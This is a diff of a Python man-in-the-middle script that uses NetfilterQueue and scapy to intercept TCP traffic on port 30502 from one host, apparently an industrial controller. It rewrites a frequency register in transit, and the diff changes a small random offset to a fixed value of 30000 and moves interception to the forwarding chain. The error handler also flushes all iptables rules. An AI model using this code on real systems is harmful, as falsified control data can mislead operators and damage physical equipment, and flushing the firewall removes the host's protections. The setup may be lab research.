@@ -3,46 +3,48 @@ from netfilterqueue import NetfilterQueue
 import random
 
 def modify_packet(scapy_packet):
+    try:
+        packet = IP(scapy_packet.get_payload())
+        if packet.haslayer(Raw):
+            payload = packet[Raw].load
+            data = payload[9:]
 
-    packet = IP(scapy_packet.get_payload())
+            first_register = int.from_bytes(data[0:2], byteorder="big")
+            if first_register == 101 and len(payload) > 100:
+                hz_register = int.from_bytes(data[32:34], byteorder="big")
+                print("Orginal Frequecy:", hz_register)
 
-    if packet.haslayer(Raw):
-        payload = packet[Raw].load
-        data = payload[9:]
+                #change_value=random.randint(-5,5)
+                change_value = 30000
+                new_sec_register = change_value#hz_register + change_value
+                new_sec_register_bytes = new_sec_register.to_bytes(2, byteorder="big")
+                modified_payload = payload[:41] + new_sec_register_bytes + payload[43:]
 
-        first_register = int.from_bytes(data[0:2], byteorder="big")
-        if first_register == 101 and len(payload) > 100:
-            hz_register = int.from_bytes(data[32:34], byteorder="big")
-            print("Orginal Frequecy:", hz_register)
+                packet[Raw].load = modified_payload
 
-            change_value=random.randint(-5,5)
-            new_sec_register = hz_register + change_value
-            new_sec_register_bytes = new_sec_register.to_bytes(2, byteorder="big")
-            modified_payload = payload[:41] + new_sec_register_bytes + payload[43:]
+                del packet[IP].len
+                del packet[IP].chksum
+                del packet[TCP].chksum
 
-            packet[Raw].load = modified_payload
+                print("Modified Frequecy:", new_sec_register)
 
-            del packet[IP].len
-            del packet[IP].chksum
-            del packet[TCP].chksum
+                scapy_packet.set_payload(bytes(packet))
 
-            print("Modified Frequecy:", new_sec_register)
-
-            scapy_packet.set_payload(bytes(packet))
-
-            print("Modified and sent packet")
+                print("Modified and sent packet")
 
 
-    scapy_packet.accept()
-
+        scapy_packet.accept()
+    except Exception as e:
+        print(f"CRITICAL ERROR: {e}")
+        traceback.print_exc()
+        scapy_packet.drop() 
+        os.system("sudo pkill -f NFQUEUE && sudo iptables -F")
 
 def setup_iptables():
-    os.system('iptables -I INPUT -p tcp --sport 30502 -s 192.168.1.15 -j NFQUEUE --queue-num 1')
-    os.system('iptables -I OUTPUT -p tcp --sport 30502 -s 192.168.1.15 -j NFQUEUE --queue-num 1')
+    os.system('iptables -I FORWARD -p tcp --sport 30502 -s 192.168.1.15 -j NFQUEUE --queue-num 1')
 
 def cleanup_iptables():
-    os.system('iptables -D INPUT -p tcp --sport 30502 -s 192.168.1.15 -j NFQUEUE --queue-num 1')
-    os.system('iptables -D OUTPUT -p tcp --sport 30502 -s 192.168.1.15 -j NFQUEUE --queue-num 1')
+    os.system('iptables -D FORWARD -p tcp --sport 30502 -s 192.168.1.15 -j NFQUEUE --queue-num 1')
 
 try:
     setup_iptables()
@@ -52,24 +54,17 @@ try:
     nfqueue.bind(1, modify_packet)
     print("[*] Starting NFQUEUE")
     print("[*] Waiting for packets")
-    nfqueue.run()
+    nfqueue.run() 
+except Exception as e:
+    print("[*] Error:", e)
 except KeyboardInterrupt:
     print("[*] Stopping NFQUEUE")
 finally:
     nfqueue.unbind()
+    print("[*] Stopped NFQUEUE")
     cleanup_iptables()
     print("[*] IPTables rules removed")
     sys.exit(0)
-
-
-
-#sudo iptables -I INPUT -p tcp --sport 30502 -s 192.168.1.14 -j NFQUEUE --queue-num 1
-#sudo iptables -I OUTPUT -p tcp --sport 30502 -s 192.168.1.14 -j NFQUEUE --queue-num 1
-
-
-# Undo Rules
-#sudo iptables -D INPUT -p tcp --sport 30502 -s 192.168.1.14 -j NFQUEUE --queue-num 1
-#sudo iptables -D OUTPUT -p tcp --sport 30502 -s 192.168.1.14 -j NFQUEUE --queue-num 1
 
 
 #4. Queue Conflict
